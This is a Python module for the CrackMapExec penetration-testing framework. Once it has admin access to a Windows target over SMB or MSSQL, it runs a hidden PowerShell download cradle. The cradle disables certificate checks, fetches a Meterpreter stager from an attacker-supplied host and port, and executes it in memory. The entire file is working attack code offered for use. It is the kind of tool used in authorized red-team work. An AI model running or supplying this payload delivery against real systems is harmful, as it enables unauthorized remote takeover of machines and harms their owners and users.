#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from sys import exit


class CMEModule:
    """
    Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
    Module by @byt3bl33d3r
    """

    name = "met_inject"
    description = "Downloads the Meterpreter stager and injects it into memory"
    supported_protocols = ["smb", "mssql"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.rand = None
        self.srvport = None
        self.srvhost = None
        self.met_ssl = None
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """
        SRVHOST     IP hosting of the stager server
        SRVPORT     Stager port
        RAND        Random string given by metasploit (if using web_delivery)
        SSL         Stager server use https or http (default: https)

        multi/handler method that don't require RAND:
            Set LHOST and LPORT (called SRVHOST and SRVPORT in CME module options)
            Set payload to one of the following (non-exhaustive list):
                windows/x64/powershell_reverse_tcp
                windows/x64/powershell_reverse_tcp_ssl
        Web Delivery Method (exploit/multi/script/web_delivery):
            Set SRVHOST and SRVPORT
            Set payload to what you want (windows/meterpreter/reverse_https, etc)
            after running, copy the end of the URL printed (e.g. M5LemwmDHV) and set RAND to that
        """

        self.met_ssl = "https"

        if "SRVHOST" not in module_options or "SRVPORT" not in module_options:
            context.log.fail("SRVHOST and SRVPORT options are required!")
            exit(1)

        if "SSL" in module_options:
            self.met_ssl = module_options["SSL"]
        if "RAND" in module_options:
            self.rand = module_options["RAND"]

        self.srvhost = module_options["SRVHOST"]
        self.srvport = module_options["SRVPORT"]

    def on_admin_login(self, context, connection):
        # stolen from https://github.com/jaredhaight/Invoke-MetasploitPayload
        command = """$url="{}://{}:{}/{}"
        $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+'''");'
        $PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\powershell.exe'
        if([Environment]::Is64BitProcess) {{ $PowershellExe='powershell.exe'}}
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName=$PowershellExe
        $ProcessInfo.Arguments="-nop -c $DownloadCradle"
        $ProcessInfo.UseShellExecute = $False
        $ProcessInfo.RedirectStandardOutput = $True
        $ProcessInfo.CreateNoWindow = $True
        $ProcessInfo.WindowStyle = "Hidden"
        $Process = [System.Diagnostics.Process]::Start($ProcessInfo)""".format(
            "http" if self.met_ssl == "http" else "https",
            self.srvhost,
            self.srvport,
            self.rand,
        )
        context.log.debug(command)
        connection.ps_execute(command, force_ps32=True)
        context.log.success("Executed payload")
